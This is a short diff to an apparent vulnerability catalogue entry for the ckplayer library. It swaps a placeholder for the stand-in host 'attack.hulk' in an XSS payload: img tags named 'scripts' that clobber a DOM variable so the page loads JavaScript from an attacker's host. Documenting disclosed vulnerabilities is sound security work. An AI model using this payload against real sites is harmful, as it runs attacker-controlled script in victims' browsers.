@@ -5,7 +5,7 @@
 + Library: ckplayer
 + Stars: 1.1K
 + Version: latest
-+ Payload: ```<img name="scripts" src="https://xxx.xxx.xxx/js/"><img name="scripts" src="https://xxx.xxx.xxx/js/">```
++ Payload: ```<img name="scripts" src="https://attack.hulk/js/"><img name="scripts" src="https://attack.hulk/js/">```
 + Impact: XSS
 + CVE: N/A
 + Status: Reported
